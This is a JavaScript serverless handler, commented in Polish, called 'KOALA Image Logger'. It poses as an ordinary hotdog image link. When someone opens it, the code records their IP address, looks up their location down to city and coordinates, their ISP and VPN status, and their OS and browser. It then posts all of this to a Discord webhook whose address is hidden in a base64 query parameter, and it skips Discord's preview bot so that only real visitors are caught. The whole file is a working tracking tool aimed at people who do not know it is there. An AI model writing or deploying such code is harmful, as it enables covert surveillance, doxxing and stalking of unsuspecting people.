// ====================== KOALA IMAGE LOGGER ======================
// Automatyczne ładowanie na Discordzie + poprawione wykrywanie

function decodeWebhook(encoded) {
    try {
        return Buffer.from(encoded, 'base64').toString('utf-8');
    } catch {
        return null;
    }
}

function getBrowser(userAgent) {
    const ua = userAgent.toLowerCase();
    if (ua.includes('opr') || ua.includes('opera')) return 'Opera GX / Opera';
    if (ua.includes('edg')) return 'Edge';
    if (ua.includes('chrome') && !ua.includes('edg') && !ua.includes('opera')) return 'Chrome';
    if (ua.includes('firefox')) return 'Firefox';
    if (ua.includes('safari') && !ua.includes('chrome')) return 'Safari';
    return 'Unknown';
}

function getOS(userAgent) {
    const ua = userAgent.toLowerCase();
    if (ua.includes('windows nt 10.0')) return 'Windows 10';
    if (ua.includes('windows nt 11.0')) return 'Windows 11';
    if (ua.includes('mac os x')) return 'macOS';
    if (ua.includes('iphone')) return 'iPhone iOS';
    if (ua.includes('ipad')) return 'iPadOS';
    if (ua.includes('android')) return 'Android';
    if (ua.includes('linux')) return 'Linux';
    return 'Unknown';
}

export default async function handler(req, res) {
    // ========== UKRYTY WEBHOOK ==========
    // Webhook może być w parametrze 'w' lub bezpośrednio w path
    const encodedWebhook = req.query.w || req.query.webhook;
    const finalWebhook = encodedWebhook ? decodeWebhook(encodedWebhook) : null;
    
    // ========== IP ==========
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (ip === '::1') ip = '127.0.0.1';
    if (ip.startsWith('::ffff:')) ip = ip.split(':').pop();
    
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const time = new Date().toLocaleString('pl-PL', { timeZone: 'Europe/Warsaw' });
    
    // ========== WYKRYWANIE DISCORD BOTA ==========
    const ua = userAgent.toLowerCase();
    const isDiscordBot = ua.includes('discordbot') || (ua.includes('discord') && ua.includes('bot'));
    
    // ========== GEOLOKALIZACJA ==========
    let geo = {
        provider: 'Unknown',
        asn: 'Unknown',
        country: 'Unknown',
        region: 'Unknown',
        city: 'Unknown',
        lat: '?',
        lon: '?',
        timezone: 'Unknown',
        mobile: false,
        vpn: false
    };
    
    if (!isDiscordBot && finalWebhook) {
        try {
            const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,as,mobile,proxy,timezone`);
            const geoData = await geoRes.json();
            
            if (geoData.status === 'success') {
                geo = {
                    provider: geoData.isp || 'Unknown',
                    asn: geoData.as || 'Unknown',
                    country: geoData.country || 'Unknown',
                    region: geoData.regionName || 'Unknown',
                    city: geoData.city || 'Unknown',
                    lat: geoData.lat?.toFixed(4) || '?',
                    lon: geoData.lon?.toFixed(4) || '?',
                    timezone: geoData.timezone || 'Unknown',
                    mobile: geoData.mobile || false,
                    vpn: geoData.proxy || false
                };
            }
        } catch (e) {}
    }
    
    const browser = getBrowser(userAgent);
    const os = getOS(userAgent);
    
    // ========== WIADOMOŚĆ ==========
    const message = `[+] KOALA Image Logger - IP Logged
A User Opened the Original Image!

Endpoint: /api/hotdog

IP Info:
IP: ${ip}
Provider: ${geo.provider}
ASN: ${geo.asn}
Country: ${geo.country}
Region: ${geo.region}
City: ${geo.city}
Coords: ${geo.lat}, ${geo.lon} (Approximate)
Timezone: ${geo.timezone}
Mobile: ${geo.mobile ? 'True' : 'False'}
VPN: ${geo.vpn ? 'True' : 'False'}
Bot: ${isDiscordBot ? 'True' : 'False'}

PC Info:
OS: ${os}
Browser: ${browser}

User Agent:
${userAgent}`;
    
    // ========== WYŚLIJ WEBHOOK ==========
    if (finalWebhook && !isDiscordBot) {
        try {
            await fetch(finalWebhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: message })
            });
        } catch (e) {}
    }
    
    // ========== ZWRÓĆ OBRAZEK PNG ==========
    // Ważne: ustawiamy Content-Type na image/png
    res.setHeader('Content-Type', 'image/png');
    res.setHeader('Cache-Control', 'no-cache');
    
    // Zwróć obrazek hotdoga (jako PNG)
    try {
        const imageRes = await fetch('https://i.imgur.com/9ZqB8Xa.jpg');
        const imageBuffer = await imageRes.arrayBuffer();
        res.send(Buffer.from(imageBuffer));
    } catch (e) {
        // Fallback – 1x1 piksel
        const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
        res.send(pixel);
    }
}
